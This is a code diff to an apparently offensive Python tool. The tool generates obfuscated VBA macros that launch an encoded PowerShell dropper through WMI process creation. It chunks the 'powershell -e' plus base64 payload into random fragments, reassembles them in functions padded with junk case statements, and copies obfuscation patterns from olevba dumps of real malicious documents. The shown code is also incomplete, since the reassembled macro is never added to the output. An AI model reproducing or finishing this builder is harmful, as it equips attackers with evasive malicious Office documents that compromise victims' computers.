@@ -101,11 +101,15 @@ def generate_obfuscated_win32_process():
 ff02.olevba:Set U9814_2_ = GetObject(A_12_92 + v1991998 + U__5062)
 '''
 def generate_win32_process_startup_object(win32_process_var_name):
+    process_startup_var = get_new_variable_name()
     vba_line = "{} = GetObject({} + {} + {})".format(
+        process_startup_var,
         get_new_variable_name(),
         win32_process_var_name,
         get_new_variable_name()
     )
+    return {"var": process_startup_var,
+            "vba_line": vba_line}
 
 '''
 77ac.olevba:i253_50_ = X159_269 + "winmgmts:Win32" + s47661 + "_ProcessStartup" + M2_65_
@@ -161,21 +165,84 @@ def generate(dropperbase64):
     payloadvariables = []
     utilityvariables = {}
 
-    process_creation_args = "powersheLl -e "
-    remaining_payload = process_creation_args + dropperbase64
-    chunked_payload = []
+    process_creation_args = "rsheLl -e "
+    remaining = process_creation_args + dropperbase64
+    chunked_list = []
+
+    while len(remaining) > 0:
+        this_chunk_size = random.randint(3, 6)
+        if this_chunk_size < len(remaining):
+            chunked_list.append(remaining[0:this_chunk_size])
+            remaining = remaining[this_chunk_size:]
+        else:
+            chunked_list.append(remaining)
+            remaining = ""
+
 
     vba = ''
+    reassembly_vba = ''
+    process_creation_vba = ''
+    auto_open_vba = ''
+
+    reassembly_tier_1_funcs = []  # this is the set of functions that will be passed to the CreateProcess.create method, each reconstructing part of the base64
+    reassembly_tier_2_vars = []  # this is the set of variables that needs to be reassembled into tier 1 after the base64 reassembly
+    reassembly_tier_2_vba = []
+
+    ##  create the tier 2 reassembly - base64 gets reassembled into variables
+
+    while len(chunked_list) > 0:
+
+        chunk_counter = 0
+        number_of_reassemblies_this_line = random.randint(5, 9)
+        this_line_var_name = get_new_variable_name()
+        reassembly_tier_2_vars.append(this_line_var_name)
+        this_vba_line = "{} = ".format(this_line_var_name)
+        if number_of_reassemblies_this_line > len(chunked_list):
+            number_of_reassemblies_this_line = len(chunked_list)
+        while chunk_counter < number_of_reassemblies_this_line:
+            this_vba_line = this_vba_line + '"' + chunked_list[0] + '"' + ' + '
+            chunked_list = chunked_list[1:]
+            chunk_counter = chunk_counter + 1
+        this_vba_line = this_vba_line[0:-3] + '\r\n'
+        reassembly_tier_2_vba.append(this_vba_line)
+
+    ##  create the tier 1 reassembly - create functions that will be run by the CreateProcess.create method
+
+    while len(reassembly_tier_2_vba) > 0:
+        new_function_counter = 0
+        number_of_reassemblies_this_function = random.randint(6, 12)
+        this_function_name = get_new_variable_name()
+        reassembly_tier_1_funcs.append(this_function_name)
+        if len(reassembly_tier_2_vba) < number_of_reassemblies_this_function:
+            number_of_reassemblies_this_function = len(reassembly_tier_2_vba)
+        reassembly_vba = reassembly_vba + "Function {}()\r\n".format(this_function_name)
+        while new_function_counter < number_of_reassemblies_this_function and len(reassembly_tier_2_vba) > 0:
+            case_counter = 0
+            cases_to_insert = random.randint(1, 3)
+            while case_counter < cases_to_insert:
+                reassembly_vba = reassembly_vba + generate_nonsense_case_statement()
+                case_counter = case_counter + 1
+            reassembly_vba = reassembly_vba + reassembly_tier_2_vba[0]
+            reassembly_tier_2_vba = reassembly_tier_2_vba[1:]
+            new_function_counter = new_function_counter + 1
+        reassembly_vba = reassembly_vba + "{} = {}\r\n".format(
+            this_function_name,
+            ' + '.join(reassembly_tier_2_vars[0:number_of_reassemblies_this_function])
+        )
+        reassembly_tier_2_vars = reassembly_tier_2_vars[number_of_reassemblies_this_function:]
+        reassembly_vba = reassembly_vba + "End Function\r\n"
+
+    print(reassembly_tier_1_funcs)
 
     playbook.append({'add_vba_module': vba})
 
     used_variable_names = []
-
     return playbook
 
 
 if __name__ == '__main__':
     # print(generate_variable_name())
     # print(generate_nonsense_case_statement())
-    print(generate_nonsense_function())
-    # print(generate("abcdefghijklmnopqrstuvqxwyABCDEFTHIJKLMNOP"))
+    #print(generate_nonsense_function())
+    import payloads
+    print(generate(payloads.get_payloads()[0]))
